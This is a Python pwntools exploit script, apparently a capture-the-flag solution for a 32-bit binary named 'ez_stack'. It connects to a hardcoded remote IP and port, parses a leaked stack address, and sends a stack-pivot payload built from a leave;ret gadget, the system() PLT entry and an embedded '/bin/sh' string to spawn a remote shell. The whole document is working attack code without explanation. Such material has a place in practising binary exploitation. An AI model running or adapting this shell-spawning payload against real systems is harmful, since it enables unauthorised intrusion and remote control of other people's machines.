#!/bin/python
from pwn import *
context(os='linux',arch='x86',log_level='debug')

#sh=process('./bin/ez_stack')
sh=remote("52.175.52.175","39004")
elf=ELF('./bin/ez_stack')
"""
gdb.attach(sh,'''
b*0x080492cc
	''')
"""
sh.recvuntil('This GIFT will help you: ')
system=elf.plt['system']
s=int(sh.recvline()[:-1],16)

leave_ret=0x08049155

ret=0x0804900a
print(repr(s))
payload=p32(ret)+p32(system)+b"a"*4+p32(s+16)+b"/bin/sh\x00"+b"a"*16+p32(s)+p32(leave_ret)
#print(payload)
sh.recvuntil('Use your magic word now:')

sh.send(payload)

sh.interactive()
